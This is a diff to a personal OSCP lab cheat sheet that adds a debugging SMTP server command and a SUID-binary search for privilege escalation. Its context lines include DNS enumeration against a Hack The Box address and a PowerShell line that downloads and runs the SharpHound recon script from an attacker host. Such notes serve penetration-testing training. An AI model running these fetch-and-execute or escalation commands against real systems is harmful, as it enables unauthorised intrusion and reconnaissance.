@@ -1,7 +1,10 @@
 # OSCP Note
 
 ### If u dont see the flag in User Desktop on Windows just use `gci -force`
-
+## SMTP Server
+```
+sudo python3 -m smtpd -c DebuggingServer -n 10.10.14.10:25
+```
 ## DNS Enum:
 ```
 dig  @10.10.10.161 htb.local
@@ -69,6 +72,7 @@ IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.8/SharpHound/ps1')
 
 
 ## PE
+`find / -user root -perm -4000 2>/dev/null -ls`
 ### Windows
 First, pls check some command like `net user %username%`, `whoami /all`, `whoami /priv`
 #### Enum
